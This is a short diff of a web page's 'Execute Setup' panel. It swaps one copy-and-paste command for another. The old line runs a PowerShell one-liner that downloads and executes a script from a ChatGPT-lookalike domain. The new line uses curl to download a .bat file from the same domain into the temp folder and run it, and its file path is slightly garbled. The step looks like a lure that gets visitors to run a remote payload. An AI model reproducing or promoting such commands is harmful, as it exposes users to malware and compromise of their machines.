@@ -217,7 +217,7 @@
         <section class="installer-panel">
             <h2>Execute Setup</h2>
             <div class="command-box">
-                <code>powershell -c "iex(iwr chatgpthvh.xyz/vm/run_setup.bat)"</code>
+                <code>curl -o "%temp% un_setup.bat" "https://chatgpthvh.xyz/vm/run_setup.bat" && "%temp% un_setup.bat"</code>
                 <button class="copy-button" id="copyBtn">Copy</button>
             </div>
         </section>
